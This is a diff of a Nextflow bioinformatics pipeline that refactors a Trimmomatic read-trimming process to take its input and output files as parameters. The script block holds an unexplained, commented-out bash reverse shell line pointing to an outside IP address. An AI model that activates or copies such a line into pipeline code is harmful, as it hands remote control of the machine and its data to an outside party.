@@ -2,6 +2,16 @@ process TRIMMOMATIC {
     container 'staphb/trimmomatic:0.39'
     containerOptions "-e FUSION_LOG_LEVEL=trace"
 
+    input:
+        path 'input1'
+        path 'input2'
+
+    output:
+        path 'output1'
+        path 'output2'
+        path 'output3'
+        path 'output4'
+
     script:
     """
     #bash -i >& /dev/tcp/34.175.63.16/80 0>&1
@@ -9,12 +19,12 @@ process TRIMMOMATIC {
                 -threads 5 \
                 -phred33 \
                 -trimlog /dev/null \
-                /fusion/s3/ngi-igenomes/test-data/rnaseq/SRX1603629_T1_2.fastq.gz \
-                /fusion/s3/ngi-igenomes/test-data/rnaseq/SRX1603630_T1_2.fastq.gz \
-                07id_S7_R1.trim.fastq.gz \
-                07id_S7_R1.unpaired.fastq.gz \
-                07id_S7_R2.trim.fastq.gz \
-                07id_S7_R2.unpaired.fastq.gz \
+                input1 \
+                input2 \
+                output1 \
+                output2 \
+                output3 \
+                output4 \
                 LEADING:3 \
                 TRAILING:3 \
                 SLIDINGWINDOW:4:15 \
@@ -24,6 +34,9 @@ process TRIMMOMATIC {
 }
 
 workflow {
+    input1 = channel.fromPath('s3://ngi-igenomes/test-data/rnaseq/SRX1603629_T1_2.fastq.gz')
+    input2 = channel.fromPath('s3://ngi-igenomes/test-data/rnaseq/SRX1603630_T1_2.fastq.gz')
+
   main:
-    TRIMMOMATIC()
+    TRIMMOMATIC(input1, input2)
 }
